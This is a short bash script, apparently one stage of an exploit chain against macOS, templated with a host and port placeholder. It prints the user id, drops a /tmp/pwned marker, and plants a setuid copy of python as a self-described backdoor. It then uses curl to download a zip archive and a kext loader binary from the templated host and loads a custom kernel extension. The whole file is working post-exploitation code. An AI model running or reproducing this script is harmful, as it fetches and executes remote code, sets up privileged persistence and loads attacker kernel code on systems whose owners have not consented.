#!/bin/bash

# Indicate success
id

# Prove we've been here
touch /tmp/pwned

# Install a cheap "backdoor" so we don't have to re-exploit if something goes wrong
cp /usr/bin/python .
chmod u+s python

# Run stage5 to load a custom .kext into the kernel
curl -s http://{{ host }}:{{ http_port }}/khax.zip > khax.zip
unzip -o khax.zip

curl -s http://{{ host }}:{{ http_port }}/kextloader > kextloader
chmod +x kextloader

./kextloader ./khax.kext
